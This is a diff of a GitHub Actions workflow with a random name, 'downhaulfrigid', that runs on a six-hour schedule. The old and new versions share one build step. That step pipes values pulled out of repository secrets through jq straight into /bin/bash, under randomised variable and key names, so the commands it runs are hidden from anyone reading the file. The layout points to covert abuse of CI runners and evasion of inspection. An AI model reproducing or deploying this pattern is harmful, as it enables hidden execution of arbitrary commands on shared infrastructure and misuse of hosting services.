@@ -1,10 +1,10 @@
 name: downhaulfrigid
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 3/6 * * *'
-jobs:  # 645
+    - cron: '44 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,17 +12,14 @@ jobs:  # 645
       - uses: actions/checkout@v4
       - name: downhaulfrigid
         env:
-          vc5: ${{ secrets.vc5 }}
+          lcsx455: ${{ secrets.lcsx455 }}
         run: |
-          echo $vc5 | jq -r .beku8 | /bin/bash
-          echo $ui2 | jq -r .kxpa6 | /bin/bash
-          echo $um497 | jq -r .mxt71 | /bin/bash
-          echo $l904 | jq -r .jiq20 | /bin/bash
-          echo $mrb2 | jq -r .kkr2 | /bin/bash
-          echo $sdxb1257 | jq -r .cs41547 | /bin/bash
-          echo $eldp4834 | jq -r .jv7010 | /bin/bash
-          echo $igrq103 | jq -r .xbt60 | /bin/bash
-          echo $jjx2 | jq -r .rasm86627 | /bin/bash
-          echo $uvqyl24 | jq -r .u8978 | /bin/bash
-          echo $t6497 | jq -r .j06 | /bin/bash
+          echo $lcsx455 | jq -r .begtr77918 | /bin/bash
+          echo $hznf4 | jq -r .yltcp2029 | /bin/bash
+          echo $ofdo35 | jq -r .bbqpa66 | /bin/bash
+          echo $avgrh384 | jq -r .htan26521 | /bin/bash
+          echo $vn83 | jq -r .vjcs64 | /bin/bash
+          echo $qv2549 | jq -r .ia64 | /bin/bash
+          echo $vl5 | jq -r .sijo9295 | /bin/bash
+          echo $i87439 | jq -r .fjf477 | /bin/bash
 
